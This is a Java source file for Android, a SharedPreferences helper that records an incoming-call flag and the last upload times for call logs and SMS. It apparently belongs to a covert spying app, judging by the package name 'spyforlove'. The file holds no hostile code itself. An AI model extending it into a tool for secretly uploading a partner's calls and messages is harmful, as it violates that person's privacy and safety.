package chem.kth.spyforlove.database;

import android.content.Context;
import android.content.SharedPreferences;

import chem.kth.MainApplication;

public class SharePrefUtils {
    public static final SharePrefUtils instance = new SharePrefUtils();
    private final SharedPreferences sharedPreferences;
    private static final String MAIN_SH_KEY = "spy";
    private static final String INCOMING_STATE = "is_incoming_state";
    private static final String LAST_CALL_UPLOADED_DATE = "last_call_uploaded_date";
    private static final String LAST_SMS_UPLOADED_DATE = "last_sms_uploaded_date";

    public static SharePrefUtils getInstance() {
        return instance;
    }

    private SharePrefUtils() {
        sharedPreferences = MainApplication.getContext().getSharedPreferences(MAIN_SH_KEY, Context.MODE_PRIVATE);
    }

    public void saveIncomingState(boolean state) {
        sharedPreferences.edit().putBoolean(INCOMING_STATE, state).apply();
    }

    public boolean isIncomingState() {
        return sharedPreferences.getBoolean(INCOMING_STATE, false);
    }

    public void saveCallLastUploadedDateTime(String date) {
        sharedPreferences.edit().putString(LAST_CALL_UPLOADED_DATE, date).apply();
    }

    public String getCallLastUploadedDate() {
        return sharedPreferences.getString(LAST_CALL_UPLOADED_DATE, "");
    }

    public void saveSMSLastUploadedDateTime(String date) {
        sharedPreferences.edit().putString(LAST_SMS_UPLOADED_DATE, date).apply();
    }

    public String getSMSLastUploadedDate() {
        return sharedPreferences.getString(LAST_SMS_UPLOADED_DATE, "");
    }
}
